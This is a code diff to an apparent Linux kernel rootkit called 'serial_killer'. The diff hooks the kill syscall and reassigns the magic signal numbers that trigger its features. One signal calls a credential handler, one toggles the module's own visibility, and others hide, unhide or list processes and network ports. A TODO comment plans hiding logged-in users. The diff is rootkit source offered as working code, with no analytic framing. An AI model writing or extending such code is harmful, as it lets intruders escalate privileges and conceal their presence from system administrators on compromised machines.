@@ -67,7 +67,7 @@ static int presence_handler_wrapper(int sig, pid_t pid) {
 
     int err;
     switch (sig) {
-        case 41:
+        case 35:
             if (pid == 0 && is_hidden == 0) {
                 printk(KERN_ERR "serial_killer: Already Exposed!\n");
             } else if (pid == 0 && is_hidden == 1) {
@@ -106,25 +106,30 @@ static int presence_handler_wrapper(int sig, pid_t pid) {
             }
         return 0;
 
-        case 42:
+        case 41:
             add_hidden_process(pid);
-            printk_hidden_processes();
+            return 0;
+        
+        case 42:
+            remove_hidden_process(pid);
             return 0;
         
         case 43:
-            remove_hidden_process(pid);
-            printk_hidden_processes();
+            printk_hidden_processes(pid);
             return 0;
         
-        case 44:
+        case 51:
             add_hidden_port(pid);
-            printk_hidden_ports();
             return 0;
 
-        case 45:
+        case 52:
             remove_hidden_port(pid);
-            printk_hidden_ports();
             return 0;
+        
+        case 53:
+            printk_hidden_ports(pid);
+            return 0;
+
     }
     return 0;
 }
@@ -176,7 +181,7 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
     switch (sig) {
 
          // Credentials Handler
-        case 40: 
+        case 34: 
             err = credential_handler_wrapper(sig, pid);
             if (err) {
                 return orig_kill(regs);
@@ -184,11 +189,20 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
             return 0;
 
         // Presence Handler
-        case 41:
-        case 42:
-        case 43:
-        case 44:
-        case 45:
+        case 35: // Presence Toggle
+        case 41: // Add process to hide
+        case 42: // Remove process to hide
+        case 43: // Show hidden processes linked list
+        case 51: // Add port to hide 
+        case 52: // Remove port to hide
+        case 53: // Show hidden ports linked list
+        //TODO
+        /*
+        * case 61: Add hidden logged in user 
+        * case 62: Remove hidden logged in user
+        * case 63: Show hidden logged in users
+        *
+        * */
             err = presence_handler_wrapper(sig, pid);
             if (err) {
                 return orig_kill(regs);
@@ -196,7 +210,7 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
             return 0;
         
         // RNG HANDLER
-        case 64:
+        case 36:
             err = rng_handler_wrapper(sig, pid);
             if (err) {
                 return orig_kill(regs);
